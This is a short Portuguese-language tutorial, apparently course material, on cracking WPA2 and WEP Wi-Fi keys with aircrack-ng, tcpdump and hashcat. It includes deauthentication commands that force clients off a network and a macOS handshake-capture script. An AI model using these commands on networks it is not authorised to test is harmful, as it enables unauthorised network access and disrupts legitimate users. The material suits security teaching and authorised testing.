# TPAS - Wireless Cracking Tutorial

Instalar o `aircrack-ng` suite e `hashcat`

Linux (Debian/Ubuntu): `apt install aircrack-ng hashcat`

OSX: `brew install aircrack-ng hashcat`

`hashcat-utils:` [https://github.com/hashcat/hashcat-utils](https://github.com/hashcat/hashcat-utils)

## WPA2 Cracking

### Linux

- Obter wordlist (e.g. https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)
- Colocar interface em monitor mode: `airmon-ng start wlan0`
- Obter o BSSID e channel da rede alvo com `airodump-ng mon0`
- Utilizar o seguinte comando para capturar um 4-way Handshake (alterar channel e BSSID): `airodump-ng -c 1 — bssid xx:xx:xx:xx:xx:xx -w capture.cap mon0`
- Enquanto esperamos pelo handshake podemos usar o aireplay para forçar que os clientes se voltem a ligar ao AP (deauth) com o comando: `aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx mon0`
- Esperar pelo WPA handshake
- `cap2hccapx capture.cap capture.hccapx`
- `hashcat -m 2500 capture.hccapx wordlist.txt`

Também é possível fazer cracking ao handshake através do `aircrack-ng` (mais lento):

- `aircrack-ng -w wordlist.txt capture.cap`

### OSX

`ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport`

- Obter wordlist (e.g. https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)
- Obter o BSSID e channel da rede alvo com `sudo airport -s`
- Utilizar o seguinte script para capturar um 4-way Handshake (alterar channel e BSSID):
```bash
export BSSID=xx:xx:xx:xx:xx:xx
export CHANNEL=1
sudo airport -z
sudo airport -c$CHANNEL
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 6 -i en0 -w beacon.cap
echo "Waiting for handshake... CTRL-C when frames > 4"
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
echo "Done"
mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
cap2hccapx capture.cap capture.hccapx
```
- Enquanto esperamos pelo handshake podemos usar o aireplay para forçar que os clientes se voltem a ligar ao AP (deauth) com a ferramenta https://github.com/0x0XDev/JamWiFi
- `hashcat -m 2500 capture.hccapx wordlist.txt` 

## WEP Cracking

- Colocar a interface em monitor mode
- Utilizar o `airodump-ng` ou Wireshark para capturar pacotes
- Utilizar o `aircrack-ng` para crackar a chave `aircrack-ng -1 -a 1 -b xx:xx:xx:xx:xx:xx capture.cap`

